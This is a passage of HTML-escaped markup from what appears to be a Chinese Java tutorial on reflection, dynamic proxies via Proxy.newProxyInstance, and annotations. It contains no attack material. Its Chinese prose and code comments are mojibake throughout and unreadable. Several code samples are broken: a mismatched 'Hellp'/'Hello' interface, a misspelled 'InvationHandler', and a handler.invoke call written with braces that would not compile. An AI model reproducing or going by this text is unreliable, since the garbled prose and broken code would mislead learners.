&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInterfaces&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å½“æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªå®ä¾‹æ˜¯å¦æ˜¯æŸä¸ªç±»å‹æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨&lt;code>instanceof&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isDouble&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Double&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isInteger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isNumber&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isSerializable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æœæ˜¯ä¸¤ä¸ª&lt;code>Class&lt;/code>å®ä¾‹ï¼Œè¦åˆ¤æ–­ä¸€ä¸ªå‘ä¸Šè½¬å‹æ˜¯å¦æˆç«‹ï¼Œå¯ä»¥è°ƒç”¨&lt;code>isAssignableFrom()&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Integer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Number n = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Number
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Object o = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Object
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// falseï¼Œå› ä¸ºNumberä¸èƒ½èµ‹å€¼ç»™Integer
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>å¯ä»¥å®ä¾‹åŒ–è€Œ&lt;code>interface&lt;/code>ä¸å¯ä»¥ï¼Œæ‰€æœ‰&lt;code>interface&lt;/code>ç±»å‹çš„å˜é‡æ€»æ˜¯é€šè¿‡æŸä¸ªå®ä¾‹å‘ä¸Šè½¬å‹å¹¶èµ‹å€¼ç»™æ¥å£ç±»å‹å˜é‡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CharSequence&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€æ–¹å¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å®šä¹‰æ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ç¼–å†™å®ç°ç±»
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloWorld&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good morning, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åˆ›å»ºå®ä¾‹ è½¬å‹ä¸ºæ¥å£å¹¶è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŠ¨æ€ä»£ç†Dynamic Proxyå¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ª&lt;code>interface&lt;/code>çš„å®ä¾‹ï¼Œä¸ç¼–å†™å®ç°ç±»ï¼Œç›´æ¥é€šè¿‡&lt;code>Proxy.newProxyInstance()&lt;/code>åˆ›å»ºä¸€ä¸ª&lt;code>Hello&lt;/code>æ¥å£å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// InvocationHandlerå®ä¾‹è´Ÿè´£å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good mornig, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#75715e">// è¿”å›çš„Objectå¼ºåˆ¶è½¬å‹ä¸ºæ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#75715e">// ä½¿ç”¨çš„ClassLoader é€šå¸¸ä¸ºæ¥å£ç±»çš„ClassLoader
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#75715e">// éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ è‡³å°‘ä¼ å…¥ä¸€ä¸ªæ¥å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ç”¨æ¥å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„InvocationHandlerå®ä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŠ¨æ€ä»£ç†å®é™…ä¸Šæ˜¯JVMåœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºclasså­—èŠ‚ç å¹¶åŠ è½½çš„è¿‡ç¨‹ï¼Œä¸Šé¢çš„æ”¹å†™ä¸ºé™æ€å®ç°æ˜¯è¿™æ ·çš„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªä¸è¿‡JVMç›´æ¥ç¼–å†™äº†è¿™ä¸ªä¸­é—´çš„ç±»ï¼Œä¸éœ€è¦æºç ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆå­—èŠ‚ç &lt;/p>
&lt;h2 id="æ³¨è§£">æ³¨è§£&lt;/h2>
&lt;p>æ³¨è§£Annotationï¼Œæ˜¯æ”¾åœ¨Javaæºç çš„ç±»ã€æ–¹æ³•ã€å­—æ®µã€å‚æ•°å‰çš„ä¸€ç§ç‰¹æ®Šæ³¨é‡Š&lt;/p>
&lt;h3 id="ä½¿ç”¨å®šä¹‰æ³¨è§£">ä½¿ç”¨&amp;amp;å®šä¹‰æ³¨è§£&lt;/h3>
&lt;p>æ³¨è§£å¯åˆ†ä¸ºä¸‰ç±»&lt;/p>
&lt;ul>
&lt;li>1 ç¼–è¯‘å™¨ä½¿ç”¨çš„æ³¨è§£ï¼šè¿™ç±»æ³¨è§£ä¸ä¼šè¢«ç¼–è¯‘è¿›å…¥&lt;code>.class&lt;/code>æ–‡ä»¶ï¼Œå®ƒä»¬åœ¨ç¼–è¯‘åå°±è¢«ç¼–è¯‘å™¨æ‰”æ‰äº†&lt;/li>
&lt;/ul>
